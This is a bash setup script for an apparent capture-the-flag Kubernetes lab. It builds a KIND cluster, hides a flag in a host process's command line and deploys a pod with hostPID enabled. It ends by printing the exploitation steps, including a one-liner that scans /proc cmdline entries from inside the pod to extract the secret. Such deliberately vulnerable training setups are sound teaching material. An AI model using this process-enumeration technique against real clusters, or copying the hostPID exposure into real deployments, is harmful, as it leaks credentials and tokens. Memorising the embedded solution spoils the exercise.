#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-23-seccomp-bypass"

FLAG="${CVE_FLAG:-flag{k8s-23-default}}"
FLAG_DIR="/home/kianabin/cve-flags/k8s-23"
mkdir -p "$FLAG_DIR"
echo "$FLAG" > "$FLAG_DIR/flag.txt"

echo "[K8S-23] hostPID Process Information Disclosure"
echo "[*] Creating KIND cluster..."
kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

echo "[*] Pre-loading container images into KIND..."
kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || echo "    Note: image load may fail, pod will pull if needed"

echo "[*] Placing flag in host process cmdline..."
# Start a background process on the KIND node with the flag in its arguments
# This simulates a real-world scenario: credentials/tokens leaked via cmdline
# in monitoring scripts, cron jobs, or daemon arguments
NODE_CONTAINER=$(docker ps --filter "name=${CLUSTER_NAME}-control-plane" --format '{{.Names}}' 2>/dev/null)
if [ -n "$NODE_CONTAINER" ]; then
  docker exec -d "$NODE_CONTAINER" sh -c \
    "echo 'CREDENTIAL_MONITOR: detected flag=${FLAG}' > /dev/null; while true; do sleep 99999; done" 2>/dev/null || \
    echo "    Warning: Could not start flag process on KIND node"
else
  echo "    Warning: Could not find KIND node container"
fi

echo "[*] Deploying pod with hostPID..."
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: monitor-ns
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: monitor-sa
  namespace: monitor-ns
---
apiVersion: v1
kind: Pod
metadata:
  name: monitor-pod
  namespace: monitor-ns
spec:
  serviceAccountName: monitor-sa
  hostPID: true
  containers:
    - name: monitor
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        privileged: false
        runAsUser: 0
        allowPrivilegeEscalation: false
        capabilities:
          drop:
            - ALL
  restartPolicy: Always
YAML

echo "[*] Waiting for pod to be ready..."
kubectl wait --for=condition=Ready pod/monitor-pod -n monitor-ns --timeout=60s 2>/dev/null || true

echo ""
echo "[+] K8S-23 hostPID Information Disclosure Ready"
echo "    Cluster: $CLUSTER_NAME"
echo "    Flag leaked in host process: --flag=$FLAG"
echo "    Flag: $FLAG"
echo ""
echo "    Exploitation steps:"
echo "    1. Pod runs with hostPID:true, no capabilities, no privileged mode"
echo "    2. Enumerate host processes: kubectl exec -n monitor-ns monitor-pod -- ps aux"
echo "    3. Find flag in process cmdline:"
echo "       kubectl exec -n monitor-ns monitor-pod -- sh -c \\"
echo "         \"for p in /proc/[1-9]*/cmdline; do tr '\\\\0' ' ' < \$p 2>/dev/null | grep -q flag && cat \$p | tr '\\\\0' ' '; done\""
echo ""
echo "    Note: hostPID=true exposes ALL host process command lines."